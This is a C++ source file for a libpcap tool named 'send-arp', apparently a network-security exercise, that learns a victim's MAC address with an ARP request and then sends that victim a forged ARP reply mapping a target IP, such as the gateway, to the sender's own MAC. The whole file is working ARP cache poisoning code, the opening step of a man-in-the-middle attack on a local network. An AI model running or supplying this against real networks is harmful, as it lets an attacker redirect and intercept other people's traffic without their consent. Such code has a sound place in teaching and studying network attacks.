#include <cstdio>
#include <pcap.h>
#include <iostream>
#include "ethhdr.h"
#include "arphdr.h"
#include "net.h"

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage();
EthArpPacket makePacket(char *EthSmac, char *EthDmac, char *ArpSmac,
	char *ArpSip, char *ArpTmac, char *ArpTip, int ArpHdrType);
bool sendPacket(pcap_t *handle, EthArpPacket *packet);
bool receiveMac(char *ipS, pcap_t *handle, char *macS);

int main(int argc, char* argv[]) {
	if (argc%2 != 0 || argc < 4) {
		usage();
		return -1;
	}

	char mac1[18] = "FF:FF:FF:FF:FF:FF";
	char mac0[18] = "00:00:00:00:00:00";

	char* dev = argv[1];
	char myIp[16], myMac[18];
	getIPAddress(myIp, dev);
	getMacAddress(myMac, dev);
	printf("myIp : %s\n", myIp);
	printf("myMac : %s\n", myMac);




	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	for (int i=2; i<argc; i+=2){
		char *senderIp = argv[i];
		char *targetIp = argv[i+1];
		char senderMac[18];

		printf("#%d\n", i/2);

		EthArpPacket packet;

		packet = makePacket(myMac, mac1, myMac, myIp, mac0, senderIp, ArpHdr::Request);
		if(!sendPacket(handle, &packet)) continue;

		if(!receiveMac(senderIp, handle, senderMac)) continue;

		packet = makePacket(myMac, senderMac, myMac, targetIp, senderMac, senderIp, ArpHdr::Reply);
		sendPacket(handle, &packet);
	}

	pcap_close(handle);
}

void usage() {
	printf("syntax: send-arp <interface> <sender ip> ,<target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

EthArpPacket makePacket(char *EthSmac, char *EthDmac, char *ArpSmac,
	char *ArpSip, char *ArpTmac, char *ArpTip, int ArpHdrType){

	EthArpPacket packet;
	packet.eth_.dmac_ = Mac(EthDmac);
	packet.eth_.smac_ = Mac(EthSmac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdrType);
	packet.arp_.smac_ = Mac(ArpSmac);
	packet.arp_.sip_ = htonl(Ip(ArpSip));
	packet.arp_.tmac_ = Mac(ArpTmac);
	packet.arp_.tip_ = htonl(Ip(ArpTip));

	return packet;
}

bool sendPacket(pcap_t *handle, EthArpPacket *packet){
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), sizeof(EthArpPacket));

	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return false;
	}
	printf("success to send a packet!\n");
	return true;
}

bool receiveMac(char *ipS, pcap_t *handle, char *macS){
	time_t t1 = time(NULL);

	while(time(NULL) - t1 < 10){
		struct pcap_pkthdr *header;
		const u_char *packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if(res == 0) continue;
		if(res == -1 || res == -2){
			printf("pacap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		EthArpPacket *ethArpPacket = (EthArpPacket *)packet;

		if(ethArpPacket->eth_.type_ != 0x0608)   // EthHdr::Arp
			continue;

		Ip ip = ethArpPacket->arp_.sip_;
		if(strcmp(ipS, std::string(ip).c_str()) == 0){
			Mac mac = ethArpPacket->arp_.smac_;
			strcpy(macS, std::string(mac).c_str());
			printf("receive the packet!\n");
			return true;
		}
	}
	printf("fail to receive the packet\n");
	return false;
}
